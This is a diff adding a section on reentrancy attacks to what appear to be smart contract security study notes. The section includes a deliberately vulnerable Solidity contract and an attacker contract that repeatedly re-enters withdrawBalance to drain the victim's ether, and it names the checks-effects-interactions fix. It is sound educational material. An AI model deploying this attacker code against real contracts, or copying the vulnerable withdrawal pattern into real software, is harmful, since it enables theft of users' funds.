@@ -21,3 +21,52 @@
           }
       }
 ```
+
+### Rentrancy Attack;
+
+Here attacker will use `ReentrancyAttacker::receive()` to call the `ReentrancyVictim::withdrawBalance()` and in middle the `ReentrancyAttacker::receive()` will be called again. It will result in attacker gaining the eth from victim balance. It will keep going until the victim balance is 0.
+It can be solved by simply moving the state change before the `ReentrancyVictim::withdrawBalance()` function. This is also known as CEI(check, effects, interaction). 
+
+```solidity
+      // SPDX-License-Identifier: MIT
+      pragma solidity 0.8.20;
+      contract ReentrancyVictim {
+          mapping(address => uint256) public userBalance;
+      
+          function deposit() public payable {
+              userBalance[msg.sender] += msg.value;
+          }
+      
+          function withdrawBalance() public {
+              uint256 balance = userBalance[msg.sender];
+              // An external call and then a state change!
+              // External call
+              (bool success,) = msg.sender.call{value: balance}("");
+              if (!success) {
+                  revert();
+              }
+      
+              // State change
+              userBalance[msg.sender] = 0;
+          }
+      }
+      
+      contract ReentrancyAttacker {
+          ReentrancyVictim victim;
+      
+          constructor(ReentrancyVictim _victim) {
+              victim = _victim;
+          }
+      
+          function attack() public payable {
+              victim.deposit{value: 1 ether}();
+              victim.withdrawBalance();
+          }
+      
+          receive() external payable {
+              if (address(victim).balance >= 1 ether) {
+                  victim.withdrawBalance();
+              }
+          }
+      }
+```
